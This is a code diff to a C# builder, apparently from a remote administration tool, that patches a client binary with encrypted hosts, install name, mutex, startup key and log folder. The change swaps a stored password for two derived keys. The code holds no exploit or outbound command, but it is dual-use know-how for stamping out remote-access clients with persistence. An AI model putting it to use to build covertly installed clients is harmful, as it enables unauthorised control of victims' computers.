@@ -22,7 +22,8 @@ namespace xServer.Core.Build
         public static void Build(BuildOptions options)
         {
             // PHASE 1 - Settings
-            string encKey = FileHelper.GetRandomFilename(20);
+            string encKey = FileHelper.GetRandomFilename(20), key, authKey;
+            CryptographyHelper.DeriveKeys(options.Password, out key, out authKey);
             AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
 
             foreach (var typeDef in asmDef.Modules[0].Types)
@@ -47,28 +48,31 @@ namespace xServer.Core.Build
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.RawHosts, encKey);
                                             break;
-                                        case 3: //password
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Password, encKey);
+                                        case 3: //key
+                                            methodDef.Body.Instructions[i].Operand = key;
                                             break;
-                                        case 4: //installsub
+                                        case 4: //authkey
+                                            methodDef.Body.Instructions[i].Operand = authKey;
+                                            break;
+                                        case 5: //installsub
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallSub, encKey);
                                             break;
-                                        case 5: //installname
+                                        case 6: //installname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallName, encKey);
                                             break;
-                                        case 6: //mutex
+                                        case 7: //mutex
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Mutex, encKey);
                                             break;
-                                        case 7: //startupkey
+                                        case 8: //startupkey
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.StartupName, encKey);
                                             break;
-                                        case 8: //encryption key
+                                        case 9: //encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
                                             break;
-                                        case 9: //tag
+                                        case 10: //tag
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Tag, encKey);
                                             break;
-                                        case 10: //LogDirectoryName
+                                        case 11: //LogDirectoryName
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.LogDirectoryName, encKey);
                                             break;
                                     }
